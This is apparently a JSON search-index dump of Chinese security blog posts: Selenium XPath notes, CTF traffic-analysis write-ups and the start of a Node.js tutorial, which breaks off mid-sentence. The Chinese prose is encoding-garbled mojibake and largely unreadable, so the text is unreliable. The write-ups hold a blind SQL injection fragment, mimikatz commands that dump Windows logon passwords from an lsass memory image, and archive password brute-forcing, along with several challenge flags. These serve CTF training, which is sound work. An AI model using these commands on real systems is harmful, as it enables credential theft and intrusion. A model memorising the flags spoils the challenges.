å¯¼å…¥win32comæ¨¡å—çš„clientå­æ¨¡å—ï¼Œç”¨äºè°ƒç”¨Windowsç³»ç»Ÿçš„COMæ¥å£ã€‚\nshell = win32com.client.Dispatch(&quot;WScript.Shell&quot;): è¿™è¡Œä»£ç ä½¿ç”¨win32comæ¨¡å—çš„Dispatchå‡½æ•°åˆ›å»ºä¸€ä¸ªåä¸ºshellçš„COMå¯¹è±¡ï¼Œè¯¥å¯¹è±¡è¡¨ç¤ºWindowsç³»ç»Ÿä¸­çš„Shellåº”ç”¨ç¨‹åºã€‚\nshell.Sendkeys(r&quot;h:\\a2.png&quot; + &#39;\\n&#39;): è¿™è¡Œä»£ç ä½¿ç”¨shellå¯¹è±¡çš„Sendkeysæ–¹æ³•ï¼Œå‘å½“å‰åº”ç”¨ç¨‹åºå‘é€ä¸€ä¸ªåŒ…å«æ–‡ä»¶è·¯å¾„å’Œå›è½¦é”®çš„é”®ç›˜æ¶ˆæ¯ã€‚å…¶ä¸­r&quot;h:\\a2.png&quot;æ˜¯è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„ï¼Œ&#39;\\n&#39;è¡¨ç¤ºå›è½¦é”®ã€‚ç”±äºè¯¥å‡½æ•°çš„å®ç°éœ€è¦é€šè¿‡Windowsçš„COMæ¥å£ä¸åº”ç”¨ç¨‹åºäº¤äº’ï¼Œå› æ­¤è¯¥å‡½æ•°çš„æ‰§è¡Œç»“æœå®é™…ä¸Šæ˜¯æ¨¡æ‹Ÿç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºä¸­æŒ‰ä¸‹äº†å¯¹åº”çš„æŒ‰é”®ã€‚\nsleep(1): è¿™è¡Œä»£ç ä½¿ç”¨timeæ¨¡å—çš„sleepå‡½æ•°ï¼Œè®©ç¨‹åºç­‰å¾…1ç§’é’Ÿï¼Œç¡®ä¿æ–‡ä»¶ä¸Šä¼ å®Œæˆã€‚\n\n\nXpathé€‰æ‹©å™¨æœ‰äº›åœºæ™¯ç”¨cssé€‰æ‹©webå…ƒç´ å¾ˆéº»çƒ¦, ç„¶è€Œxpathæ¯”è¾ƒæ–¹ä¾¿\nç»å¯¹è·¯å¾„é€‰æ‹©ç›¸å½“äºcssé€‰æ‹©å™¨çš„&gt;\nä¾‹å¦‚, \nelements = driver.find_elements(By.XPATH, &quot;/html/body/div&quot;)\n\nå°±ç›¸å½“äº\nelements = driver.find_elements(By.CSS_SELECTOR, &quot;html&gt;body&gt;div&quot;)\n\nç›¸å¯¹è·¯å¾„é€‰æ‹©ç›¸å½“äºcssé€‰æ‹©å™¨ä¸­çš„ \nelements = driver.find_elements(By.XPATH, &quot;//div//p&quot;)\n\nç›¸å½“äº\nelements = driver.find_elements(By.CSS_SELECTOR,&quot;div p&quot;)\n\né€šé…ç¬¦å¦‚æœè¦é€‰æ‹©æ‰€æœ‰divèŠ‚ç‚¹çš„æ‰€æœ‰ç›´æ¥å­èŠ‚ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨è¡¨è¾¾å¼ //div/*\n* æ˜¯ä¸€ä¸ªé€šé…ç¬¦ï¼Œå¯¹åº”ä»»æ„èŠ‚ç‚¹åçš„å…ƒç´ ï¼Œç­‰ä»·äºCSSé€‰æ‹©å™¨ div &gt; *\næ ¹æ®å±æ€§é€‰æ‹©Xpathå¯ä»¥æ ¹æ®å±æ€§æ¥é€‰æ‹©å…ƒç´ , å¤§è‡´æ ¼å¼æ˜¯[@å±æ€§å=&#39;å±æ€§å€¼&#39;]\nè¿™é‡Œå±æ€§å€¼å¯ä»¥ä¸ºç©º\næ³¨æ„:\n\nå±æ€§åå‰é¢è¦æœ‰@\nå±æ€§å€¼è¦æœ‰å¼•å·, å•åŒæ— æ‰€è°“\n\nä½†æ˜¯xpathä¸cssä¸åŒçš„æ˜¯, xpathé€‰æ‹©æ—¶, å¿…é¡»è¦æœ‰æ ‡ç­¾å, ä½†æ˜¯æ ‡ç­¾åå¯ä»¥ç”¨*é€šé…\nä¾‹å¦‚\nå±æ€§å€¼åŒ…å«å­—ç¬¦ä¸²è¦é€‰æ‹© styleå±æ€§å€¼ åŒ…å« color å­—ç¬¦ä¸²çš„ é¡µé¢å…ƒç´  ï¼Œå¯ä»¥è¿™æ · //*[contains(@style,&#39;color&#39;)]\nè¦é€‰æ‹© styleå±æ€§å€¼ ä»¥ color å­—ç¬¦ä¸² å¼€å¤´ çš„ é¡µé¢å…ƒç´  ï¼Œå¯ä»¥è¿™æ · //*[starts-with(@style,&#39;color&#39;)]\nè¦é€‰æ‹© styleå±æ€§å€¼ ä»¥ æŸä¸ª å­—ç¬¦ä¸² ç»“å°¾ çš„ é¡µé¢å…ƒç´  ï¼Œå¤§å®¶å¯ä»¥æ¨æµ‹æ˜¯ //*[ends-with(@style,&#39;color&#39;)]ï¼Œ ä½†æ˜¯ï¼Œå¾ˆé—æ†¾ï¼Œè¿™æ˜¯xpath 2.0 çš„è¯­æ³• ï¼Œç›®å‰æµè§ˆå™¨éƒ½ä¸æ”¯æŒ\næŒ‰æ¬¡åºé€‰æ‹©xpathå¯ä»¥ç›´æ¥åœ¨[]ä¸­ä½¿ç”¨æ•°å­—è¡¨ç¤ºæ¬¡åº\næŸç±»å‹çš„ç¬¬å‡ ä¸ªå…ƒç´ //p[2]\n\né€‰æ‹©çš„æ˜¯pç±»å‹çš„ç¬¬äºŒä¸ªå­å…ƒç´ , ç›¸å½“äºcssé€‰æ‹©å™¨çš„\n:nth-of-type()\n\nç¬¬å‡ ä¸ªå­å…ƒç´ çš„è¯, å¯ä»¥ç”¨é€šé…ç¬¦*æ¥ä»£æ›¿ç±»å‹\n//*[2]\n\næŸç±»å‹çš„å€’æ•°ç¬¬å‡ ä¸ªå­å…ƒç´ ä½¿ç”¨last()-æ•°å­—\n\nå€’æ•°ç¬¬ä¸€ä¸ª\n//p[last()]\nå€’æ•°ç¬¬äºŒä¸ª\n//p[last()-1]\n\nèŒƒå›´é€‰æ‹©ä½¿ç”¨position()\n\næ¯”å¦‚è¯´optionç±»å‹çš„å‰ä¸¤ä¸ªå…ƒç´ \n\nå¯ä»¥æ˜¯\n//option[position()&lt;=2]\n\næˆ–è€…\n//option[position()&lt;3]\n\n\né€‰æ‹©classå±æ€§ä¸ºmulti_choiceçš„å‰3ä¸ªå­å…ƒç´ \n\n//*[@class=&#x27;multi_choice&#x27;]/*[position()&lt;=3]\n\n\né€‰æ‹©classå±æ€§ä¸ºmulti_choiceçš„å3ä¸ªå­å…ƒç´ \n\n//*[@class=&#x27;multi_choice&#x27;]/*[position()&gt;=last()-2]\n\nç»„é€‰æ‹©å’Œå…„å¼ŸèŠ‚ç‚¹ç»„é€‰æ‹©cssæœ‰ç»„é€‰æ‹©, å¯ä»¥åŒæ—¶å¤šä¸ªè¡¨è¾¾å¼, å¤šä¸ªè¡¨è¾¾å¼é€‰æ‹©çš„ç»“æœéƒ½æ˜¯è¦é€‰æ‹©çš„å…ƒç´ \ncssç»„é€‰æ‹©, è¡¨è¾¾å¼ä¹‹é—´ç”¨,éš”å¼€\nxpathç»„é€‰æ‹©, è¡¨è¾¾å¼ç”¨|éš”å¼€\næ¯”å¦‚ï¼Œè¦é€‰æ‰€æœ‰çš„optionå…ƒç´  å’Œæ‰€æœ‰çš„ h4 å…ƒç´ ï¼Œå¯ä»¥ä½¿ç”¨\n//option | //h4\n\nç­‰åŒäºcssé€‰æ‹©å™¨çš„\noption , h4\n\nå†æ¯”å¦‚ï¼Œè¦é€‰æ‰€æœ‰çš„ class ä¸º single_choice å’Œ class ä¸º multi_choice çš„å…ƒç´ ï¼Œå¯ä»¥ä½¿ç”¨\n//*[@class=&#x27;single_choice&#x27;] | //*[@class=&#x27;multi_choice&#x27;]\n\nç­‰åŒäºcssé€‰æ‹©å™¨\n.single_choice , .multi_choice\n\né€‰æ‹©çˆ¶èŠ‚ç‚¹xpathå¯ä»¥é€‰æ‹©çˆ¶èŠ‚ç‚¹, è€Œcssæ²¡æœ‰è¿™ä¸€åŠŸèƒ½, çˆ¶èŠ‚ç‚¹ç”¨/..è¡¨ç¤º\næ¯”å¦‚ï¼Œè¦é€‰æ‹© id ä¸º china çš„èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ï¼Œå¯ä»¥è¿™æ ·å†™ //*[@id=&#39;china&#39;]/.. \nå½“æŸä¸ªå…ƒç´ æ²¡æœ‰ç‰¹å¾å¯ä»¥ç›´æ¥é€‰æ‹©ï¼Œä½†æ˜¯å®ƒæœ‰å­èŠ‚ç‚¹æœ‰ç‰¹å¾ï¼Œ å°±å¯ä»¥é‡‡ç”¨è¿™ç§æ–¹æ³•ï¼Œå…ˆé€‰æ‹©å­èŠ‚ç‚¹ï¼Œå†æŒ‡å®šçˆ¶èŠ‚ç‚¹ã€‚\nå…„å¼ŸèŠ‚ç‚¹é€‰æ‹©ç±»ä¼¼äºå‰é¢cssé€‰æ‹©å™¨çš„~\nè¿™é‡Œxpathç”¨following-sibling::\næ¯”å¦‚ï¼Œè¦é€‰æ‹© class ä¸º single_choice çš„å…ƒç´ çš„æ‰€æœ‰åç»­å…„å¼ŸèŠ‚ç‚¹ \n//*[@class=&#x27;single_choice&#x27;]/following-sibling::*\n\nç­‰åŒäºCSSé€‰æ‹©å™¨\n.single_choice ~ *\n\nå¦‚æœï¼Œè¦é€‰æ‹©åç»­èŠ‚ç‚¹ä¸­çš„divèŠ‚ç‚¹ï¼Œ å°±åº”è¯¥è¿™æ ·å†™\n//*[@class=&#x27;single_choice&#x27;]/following-sibling::div\n\nxpathè¿˜å¯ä»¥é€‰æ‹©å‰é¢çš„å…„å¼ŸèŠ‚ç‚¹, ä½¿ç”¨preceding-sibling::\næ¯”å¦‚ï¼Œè¦é€‰æ‹© class ä¸º single_choice çš„å…ƒç´ çš„æ‰€æœ‰å‰é¢çš„å…„å¼ŸèŠ‚ç‚¹ \n//*[@class=&#x27;single_choice&#x27;]/preceding-sibling::*\n\nè€ŒCSSé€‰æ‹©å™¨ç›®å‰è¿˜æ²¡æœ‰æ–¹æ³•é€‰æ‹©å‰é¢çš„ å…„å¼ŸèŠ‚ç‚¹\næƒ³äº†è§£æ›´å¤šå¯ä»¥å…³æ³¨ä¸€ä¸‹xapthæ‰‹å†Œ\nselenium æ³¨æ„ç‚¹æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­\næˆ‘ä»¬çš„ä»£ç ï¼š\n\nå…ˆé€‰æ‹©ç¤ºä¾‹ç½‘é¡µä¸­ï¼Œidæ˜¯chinaçš„å…ƒç´ \nç„¶åé€šè¿‡è¿™ä¸ªå…ƒç´ çš„WebElementå¯¹è±¡ï¼Œä½¿ç”¨find_elements_by_xpathï¼Œé€‰æ‹©é‡Œé¢çš„på…ƒç´ ï¼Œ\n\n# å…ˆå¯»æ‰¾idæ˜¯chinaçš„å…ƒç´ china = wd.find_element(By.ID, &#x27;china&#x27;)# å†é€‰æ‹©è¯¥å…ƒç´ å†…éƒ¨çš„på…ƒç´ elements = china.find_elements(By.XPATH, &#x27;//p&#x27;)# æ‰“å°ç»“æœfor element in elements:    print(&#x27;----------------&#x27;)    print(element.get_attribute(&#x27;outerHTML&#x27;))\n\nè¿è¡Œå‘ç°ï¼Œæ‰“å°çš„ ä¸ä»…ä»…æ˜¯ chinaå†…éƒ¨çš„på…ƒç´ ï¼Œ è€Œæ˜¯æ‰€æœ‰çš„på…ƒç´ ã€‚\nè¦åœ¨æŸä¸ªå…ƒç´ å†…éƒ¨ä½¿ç”¨xpathé€‰æ‹©å…ƒç´ ï¼Œ éœ€è¦ åœ¨xpathè¡¨è¾¾å¼æœ€å‰é¢åŠ ä¸ªç‚¹ ã€‚\nåƒè¿™æ ·\nelements = china.find_elements(By.XPATH, &#x27;.//p&#x27;)\n","tags":["Study","python","Selenium"]},{"title":"(é™‡å‰‘æ¯ 2021) SQLæ³¨å…¥ç³»åˆ—","url":"/2022/04/29/SQLflow/","content":"ï¼ˆ1ï¼‰ç¬¬ä¸€é¢˜ï¼Œçœ‹SQLæ³¨å…¥çš„è¯­å¥ï¼Œå¾ˆæ˜æ˜¾æ˜¯å¸ƒå°”ç›²æ³¨çš„ç‰¹å¾\nï¼ˆ2ï¼‰è¿™é¢˜æ›´æ²¡åŠ²ï¼Œæ ¹æ®æˆ‘çš„ç»éªŒï¼Œæµé‡åˆ†æå€’ç€çœ‹å°±å¯¹äº†\n\n(select%20flag%20from%20sqli.flag),43,1)%20=%20â€™+â€™,1,(select%20table_name%20from%20information_schema.tables)\n\næ•°æ®åº“å#è¡¨å#å­—æ®µåæ˜¾è€Œæ˜“è§\nï¼ˆ3ï¼‰å°†æ—¥å¿—å¯¼å…¥excelï¼Œç­›é€‰è¿”å›é•¿åº¦479 480 481 482\n\nç„¶åå†æ‹¿wordæ›¿æ¢ä¸€ä¸‹ï¼Œå¾—åˆ°\n\nflag{deddcd67-bcfd-487e-b940-1217e668c7db}\nå½“ç„¶ä¹Ÿå¯ä»¥å†™ä¸ªè„šæœ¬\n","tags":["wp","flow","Misc"]},{"title":"SkyMirror_WP_æµé‡åˆ†æ","url":"/2022/05/03/SkyMirror-WP-simple-flow/","content":"æ•°æ®åŒ…ä¸­çš„çº¿ç´¢é¢˜ç›®åœ¨è¿™å„¿\nwiresharkæ‰“å¼€ï¼Œè¿½è¸ªæµä¸€æ³¢\n\nè¿™base64ç¼–ç ï¼Œæ¥è¿™å„¿è§£ç ä¸€ä¸‹\nç„¶åå°±èƒ½å¾—åˆ°ä¸€å¼ å›¾ç‰‡\n\nflagæ˜¾è€Œæ˜“è§\nè¢«å·èµ°çš„æ–‡ä»¶é¢˜ç›®åœ¨è¿™å„¿\nè¿™é¢˜å¯ä¸å…¨æ˜¯æµé‡åˆ†æ \nwiresharkçœ‹ä¸€æ³¢\n\nä¸€æ‰“çœ¼ï¼Œæœ‰ftpï¼Œä¸€æƒ³ã€Šæ–‡ä»¶ã€‹ï¼Œç­›é€‰ä¸€ä¸‹ftp\n\nè¿½è¸ªä¸€æ³¢\n\nçœ‹è§äº†rar\nç„¶åforemoståˆ†ç¦»ä¸€æ³¢\nè®²åˆ°foremostï¼ŒKali linuxé‡Œä¸€èˆ¬æœ‰ï¼Œå¦‚æœä¸‡ä¸€æ²¡æœ‰ï¼Œåƒæˆ‘ä¸‹è½½çš„kali2021ï¼Œå¯ä»¥aptä¸‹è½½ä¸€ä¸‹\nåƒè¿™æ ·\n\nsudo apt-get updatesudo apt-get install foremost\n\nç„¶åç›´æ¥\n\nforemost  æ–‡ä»¶åœ°å€/æ–‡ä»¶å\n\nå¦‚æœæ˜¯å­˜åœ¨äº†kaliç›®å½•ä¸‹ï¼Œå°±ä¸ç”¨åŠ æ–‡ä»¶åœ°å€äº†\nåˆ†ç¦»å¾—åˆ°çš„å‹ç¼©åŒ…ï¼Œæˆ‘æ²¡æœ‰å¾—åˆ°å¯†ç ï¼Œç›´æ¥å°±çˆ†ç ´äº†ï¼ˆå› ä¸ºæ²¡æœ‰å¾—åˆ°ä»»ä½•æç¤ºï¼‰\nARCHPRå››ä½æ•°å­—æ©ç çˆ†ç ´\n\nå¯†ç 5790\nè§£å‹å¾—åˆ°flag\nèœåˆ€666ç»Ÿè®¡HTTPçœ‹ä¸€çœ‹ï¼Œæœ‰ä¸ª/upload/1.php\nCTRL+Fæœä¸€ä¸‹1.phpï¼Œè¿‡æ»¤ä¸‹HTTP\nè¿½è¸ªHTTPæµçœ‹ä¸€çœ‹\nå°æŠ€å·§ï¼Œå€’ç€çœ‹\n\næœ‰ä¸ªå‹ç¼©åŒ…ï¼Œæ•´å‡ºæ¥ï¼Œå‹ç¼©åŒ…ï¼Œæœ‰å¯†ç ï¼Œè€Œä¸”æç¤ºäº†\n\nç»§ç»­çœ‹\n\nZ2è§£ç ï¼Œåå…­è¿›åˆ¶ï¼Œè§£ç \næ˜¯ä¸ªå›¾ç‰‡\n\næå®šï¼ï¼ï¼\ntelnetè¿™é¢˜ä¸€çœ‹é¢˜ç›®telnetï¼Œé¦–å…ˆå°±è¿‡æ»¤telnet\nè¿½è¸ªæµä¸€çœ‹ï¼Œå‘ç°passwordæœ‰æç¤º\n\nç»†å¿ƒçš„å°ä¼™ä¼´ä¼šå‘ç°è¿™é‡Œæœ‰ä¸€äº›ç‚¹ï¼Œçº¢è‰²æ˜¯æºåˆ°ç›®çš„åœ°ï¼Œè“è‰²åä¹‹ï¼Œæˆ‘ä»¬å•ç‹¬çœ‹ä¸€ä¸‹çº¢è‰²çš„å†…å®¹ï¼Œå‘ç°å˜æˆäº†ä¸‰ä¸ªç‚¹ï¼Œè¿™ä¸‰ä¸ªç‚¹æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œè€Œä¸æ˜¯çœŸæ­£çš„ä¸‰ä¸ªç‚¹\n\nçœ‹16è¿›åˆ¶ï¼Œå‘ç°08\n\næ‰¾ASCIIç è¡¨ï¼Œå‘ç°08æ˜¯é€€æ ¼å­—ç¬¦\n\næ‰€ä»¥å¾—åˆ°flag\n\n28d982kwalx8e\n\n[CISCN 2021åˆèµ›]roboté¢˜ç›®åœ¨[è¿™å„¿](http://ctfer.club/challenges#[CISCN 2021åˆèµ›]robot-128)\nè¿™æ˜¯å»å¹´å›½èµ›é‡Œæ¯”è¾ƒç®€å•çš„ä¸€é¢˜ï¼Œè¿™ç©æ„å‹ç¼©åŒ…ä¸€å¨ä¸œè¥¿ï¼Œå…¶å®ä¹Ÿå°±æµé‡æ˜¯æœ‰ç”¨çš„ï¼Œæ ¹æ®å…¶ä»–æ–‡ä»¶ç™¾åº¦æ¥çœ‹ï¼Œèƒ½çŸ¥é“è¿™æ˜¯ä¸ªç”»å›¾çš„robotã€‚çœ‹çœ‹æµé‡é‡Œæœ‰æ²¡æœ‰ä»€ä¹ˆåæ ‡ç›¸å…³çš„ã€‚\næ— è„‘è¿½è¸ªæµçœ‹ä¸€çœ‹ï¼Œ\n\nå¥½åƒåæ ‡ï¼Œgrepåˆ†å‡ºæ¥\n\nstrings a cap.pcapng |grep &quot;\\[.*\\]&quot; | sort -u &gt; 123.txt\n\nè¿™ç§æ•°æ®gnuplotæ²¡æ³•è¯†åˆ«ï¼Œæ‰€ä»¥\nfile = open(&quot;123.txt&quot;,&#x27;r&#x27;)indata = file.read()obj = indata.replace(&quot;[&quot;,&quot;&quot;).replace(&quot;]&quot;,&quot;&quot;).replace(&quot;,&quot;,&quot; &quot;)out_file = open(&quot;out.txt&quot;,&#x27;w&#x27;)out_file.write(obj)print(&#x27;alright&#x27;)\n\nç„¶åä¸Šåˆ°gnuplot\n\nplot &quot;out.txt&quot;\n\n\næ—‹è½¬é•œåƒå¯¹ç§°ä¸€ä¸‹\n\neasy_robo_xx\nè®°å¾—MD5è§£ä¸€ä¸‹\nè¿˜æ˜¯è¿™é‡Œ\nå¾—åˆ°flagd4f1fb80bc11ffd722861367747c0f10\n[GKCTF 2021]ç­¾åˆ°è¿™ä¹Ÿé…å«ç­¾åˆ°é¢˜ï¼Ÿé¢˜ç›®[é“¾æ¥]([SkyMirror (ctfer.club)](http://ctfer.club/challenges#[GKCTF 2021]ç­¾åˆ°-129))\næœ¬ä»¥ä¸ºæ˜¯ç­¾åˆ°é¢˜ï¼Œæ‰“å¼€CTRL+Fæœä¸€ä¸‹flagï¼Œæ²¡æœ‰ï¼Œåäº†ï¼Œä¸æ˜¯ç­¾åˆ°\nè¿½è¸ªä¸€ä¸‹tcpå§ï¼Œè¿½è¸ªåˆ°5ï¼Œå‘ç°äº†f14g\n\nä¹±ç ï¼Œè¿˜æ˜¯çœ‹HTTPæµå§\nå‘ç°äº†\n\n64306c455357644251306c6e51554e4a5a3046355355737764306c7154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7154576c44546d39525241707154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7162314645616b46445357644251306c6e51554e4a5a32644554545a46524530325157704e5a3046365458524e524531305257704e436e5177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d644442705130354e65556c7154586c4a616b31355357704e65556b4b4e6b467154576442656b31305455524e644556715458644a616b38775a566f324d6d56774e557377643074795556645a64315a485a48593152556c3051576c4e4d5546355a4777316255733254545a7162475a7763573579555552304d464e4d64444254544170304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d537a42425357526159585a764e7a567462485a735130354e564530325255524e436e6f77655531334d464e4e6555467154545a524e327877596a647362584a5252484a7a5131706f516c68614d446c745647637751306c355655524a4d315a74596e4676656d3951567974736357563151303477553078304d464e4d64444254544851775530774b63336858576d786b4d5659354d544e6c4e325179576d684752324a7a576d31615a7a427363446c7064573569567974585a7a427363446c7064573569567974585a7a427363446c706457356956797458537a423354586876564531336230524e6555464454517045546a4252524534775555527356324636546c684e65444258596d593562464a48556b524f5245347759584a6b4d464a6d4f565a6162444658596e644252456c6b556d46746345524c61577832526b6c6b556d46746345524c61577832566b747754544a5a436a303955556c6f545442525245347755516f3d\n\nåƒbase16\n\n\nbase64è§£\n\næ ¹æ®æœ€åä¸€è¡Œé€†åºå—ï¼Ÿå¥½åƒè¿˜æ˜¯ä¸€è¡Œä¸€è¡Œçš„\na = &quot;wIDIgACIgACIgAyIK0wIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMiCNoQD&quot;b = &quot;jMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjoQDjACIgACIgACIggDM6EDM6AjMgAzMtMDMtEjM&quot;c = &quot;t0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0iCNMyIjMyIjMyIjMyI&quot;d = &quot;6AjMgAzMtMDMtEjMwIjO0eZ62ep5K0wKrQWYwVGdv5EItAiM1Aydl5mK6M6jlfpqnrQDt0SLt0SL&quot;e = &quot;t0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLK0AIdZavo75mlvlCNMTM6EDM&quot;f = &quot;z0yMw0SMyAjM6Q7lpb7lmrQDrsCZhBXZ09mTg0CIyUDI3VmbqozoPW+lqeuCN0SLt0SLt0SLt0SL&quot;g = &quot;sxWZld1V913e7d2ZhFGbsZmZg0lp9iunbW+Wg0lp9iunbW+Wg0lp9iunbW+WK0wMxoTMwoDMyACM&quot;h = &quot;DN0QDN0QDlWazNXMx0Wbf9lRGRDNDN0ard0Rf9VZl1WbwADIdRampDKilvFIdRampDKilvVKpM2Y&quot;i = &quot;==QIhM0QDN0Q&quot;print(a[::-1])print(b[::-1])print(c[::-1])print(d[::-1])print(e[::-1])print(f[::-1])print(g[::-1])print(h[::-1])print(i[::-1])\n\n\nå»é‡ï¼Œflagå‡ºäº†\nflag&#123;Welc0me_GkC4F_m1siCCCCCC!&#125;\n[å®‰æ´µæ¯ 2019]Attackä¹‹å‰åšè¿‡ä¸€æ¬¡èœåˆ€çš„æµé‡åˆ†æï¼Œè¿™æ¬¡æ¥åšä¸€ä¸ªèšå‰‘çš„\nè¿™é¢˜æŒºå¼ºçš„ï¼Œé¢˜ç›®ä¹Ÿæ˜¯åœ¨[è¿™å„¿]([SkyMirror (ctfer.club)](http://ctfer.club/challenges#[å®‰æ´µæ¯ 2019]Attack-139))\nè€æ ·å­ï¼Œå…ˆæœç´¢flagçœ‹çœ‹\n\n\nè¿™é‡Œä¹Ÿæ˜¯çœ‹åˆ°äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œç„¶åæˆ‘æ‰‹æäº†néï¼Œä¸€ç›´æ²¡æå‡†ç¡®ï¼Œç„¶åå°±foremostäº†ï¼Œå‡ºä¸€ä¸ªå‹ç¼©åŒ…\nç¼ºå¯†ç ï¼Œç»§ç»­çœ‹ã€‚\nå¯¼å‡ºå¯¹è±¡çœ‹çœ‹\n\nè¿™å•¥ç©æ„ï¼Œä¸Šç™¾åº¦\n\nå…³äºlsasslsassæ˜¯windowsç³»ç»Ÿçš„ä¸€ä¸ªè¿›ç¨‹ï¼Œç”¨äºæœ¬åœ°å®‰å…¨å’Œç™»é™†ç­–ç•¥ã€‚mimikatzå¯ä»¥ä» lsass.exe é‡Œè·å–windowså¤„äºactiveçŠ¶æ€è´¦å·æ˜æ–‡å¯†ç ã€‚æœ¬é¢˜çš„lsass.dmpå°±æ˜¯å†…å­˜è¿è¡Œçš„é•œåƒï¼Œä¹Ÿå¯ä»¥æå–åˆ°è´¦æˆ·å¯†ç \nä¸‹è½½https://github.com/gentilkiwi/mimikatz/releases/\nå¦‚ä½•ä½¿ç”¨æŠŠlsass.dmpå¤åˆ¶åˆ°mimikatzçš„ç›®å½•ï¼Œç„¶åè¿è¡Œmimikatzï¼ˆä¸€å®šè¦ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼‰\n\n//æå‡æƒé™privilege::debug//è½½å…¥dmpæ–‡ä»¶sekurlsa::minidump lsass.dmp//è¯»å–ç™»é™†å¯†ç sekurlsa::logonpasswords full\n\n\nè¿™ä¹Ÿå°±æ˜¯å‹ç¼©åŒ…å¯†ç äº†ï¼Œè§£å‹å¾—åˆ°flag\n","tags":["python","wp","SkyMirror","simple_flow"]},{"title":"Web_11_Node.js","url":"/2023/05/30/Web_11_Node.js/","content":"Node.jsåŸºç¡€ç®€å•çš„è¯´nodejså°±æ˜¯è¿è¡Œåœ¨æœåŠ¡ç«¯çš„JavaScript, Node.jsæ˜¯ä¸€ä¸ªåŸºäºchrome JavaScriptè¿è¡Œæ—¶å»ºç«‹çš„ä¸€ä¸ªå¹³å°, Node.jsæ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨I/OæœåŠ¡ç«¯JavaScriptç¯å¢ƒ, åŸºäºGoogleçš„V8å¼•æ“, V8å¼•æ“æ‰§è¡ŒJavascriptçš„é€Ÿåº¦éå¸¸å¿«ï¼Œæ€§èƒ½éå¸¸å¥½ã€‚åœ¨æµè§ˆå™¨æ§åˆ¶å°æˆ–è€…nodeçš„è¿è¡Œç¯å¢ƒéƒ½å±äºreplè¿è¡Œç¯å¢ƒ, å‡å¯è¿è¡ŒJavaScriptä»£ç \nåœ¨Node.jsä¸­åˆ†ä¸ºä¸‰ä¸ªæ¨¡å—, åˆ†åˆ«æ˜¯: æ ¸å¿ƒæ¨¡å—/è‡ªå®šä¹‰æ¨¡å—/ç¬¬ä¸‰æ–¹æ¨¡å—\nè¿™é‡Œæä¸€ç‚¹, JavaScriptåœ¨ç¼–ç¨‹æ—¶, å¦‚æœéœ€è¦ä½¿ç”¨æŸä¸ªæ¨¡å—çš„åŠŸèƒ½, é‚£ä¹ˆå°±éœ€è¦æå‰å°†å…¶å¯¼å…¥, ä¸Pythonç±»ä¼¼, åªä¸è¿‡åœ¨Pythonä¸­ä½¿ç”¨importå…³é”®å­—, è€Œåœ¨JavaScriptä¸­ä½¿ç”¨requireå…³é”®å­—\nNode.js å®‰è£…å¤§å®¶å¯ä»¥è‡ªè¡Œå»èœé¸Ÿå­¦ä¹ å®‰è£…é…ç½®\nå®‰è£…å®Œæˆå, å¤§å®¶å¯ä»¥åœ¨å‘½ä»¤è¡Œæµ‹è¯•ä¸€ä¸‹\nè¯»å–æ–‡ä»¶æ“ä½œæ–‡ä»¶ç³»ç»Ÿæ¨¡å—å°±æ˜¯æ ¸å¿ƒæ¨¡å—\nfsæ–‡ä»¶æ“ä½œæ¨¡å—, åŒæ­¥å‡½æ•°: readFileSync; å¼‚æ­¥å‡½æ•°: readFile\nåŒºåˆ«:\n\nåŒæ­¥æ–¹æ³•: ç­‰å¾…æ¯ä¸ªæ“ä½œå®Œæˆ, ç„¶åæ‰§è¡Œä¸‹ä¸€ä¸ªæ“ä½œ (å…ˆåƒé¥­å†çœ‹ç”µè§†)\nå¼‚æ­¥æ–¹æ³•: ä»ä¸ç­‰å¾…æ¯ä¸ªæ“ä½œå®Œæˆ, è€Œæ˜¯æ—¨åœ¨ç¬¬ä¸€æ­¥æ‰§è¡Œæ‰€æœ‰æ“ä½œ (è¾¹åƒé¥­è¾¹çœ‹ç”µè§†)\n\nvar fs = require(&#x27;fs&#x27;);//å¼‚æ­¥è¯»å–fs.readFile(&#x27;./test.txt&#x27;, function (err, data)&#123;    if (err) &#123;        return console.error(err)    &#125;    console.log(&quot;å¼‚æ­¥è¯»å–ï¼š&quot; + data.toString());&#125;);//åŒæ­¥è¯»å–var data = fs.readFileSync(&#x27;./test.txt&#x27;)console.log(&quot;åŒæ­¥è¯»å–:&quot; + data.toString());console.log(&quot;ç¨‹åºæ‰§è¡Œå®Œæ¯•&quot;)\n\n\n\nå½“ä½ å…ˆè¯»å–æ–‡ä»¶è¾“å‡ºåè¾“å‡ºä¸€æ®µè¯çš„æ—¶å€™åŒæ­¥ï¼šå…ˆè¾“å‡ºæ–‡ä»¶å†…å®¹ï¼Œå†è¾“å‡ºä¸€æ®µè¯å¼‚æ­¥ï¼šå…ˆè¾“å‡ºä¸€æ®µè¯ï¼Œåè¾“å‡ºæ–‡ä»¶å†…å®¹\n\nè¯»å–æ–‡ä»¶æ“ä½œ, ä¸‹é¢ä¼šåœ¨CTFä¾‹é¢˜ä¸­ç”¨åˆ°. æ˜¾ç¤ºäº†è¯»å–æ–‡ä»¶çš„å„ç§å§¿åŠ¿\nå…¨å±€å˜é‡\n__dirname: å½“å‰æ¨¡å—çš„ç›®å½•å\n__filename: å½“å‰æ¨¡å—çš„æ–‡ä»¶å, 